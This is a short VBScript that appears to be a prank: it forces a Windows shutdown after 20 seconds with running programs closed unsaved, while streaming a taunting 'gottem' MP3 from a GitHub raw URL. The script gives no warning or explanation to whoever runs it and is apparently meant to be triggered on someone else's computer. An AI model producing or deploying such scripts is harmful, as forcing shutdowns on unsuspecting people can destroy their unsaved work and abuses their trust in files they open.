Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "C:\WINDOWS\system32\shutdown.exe /s /f /t 20 /c "" """
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
oPlayer.URL = "https://raw.githubusercontent.com/PauHPMCBR/raberdaki/main/gottem.mp3"
oPlayer.controls.play
objShell.Run "cmd exit"
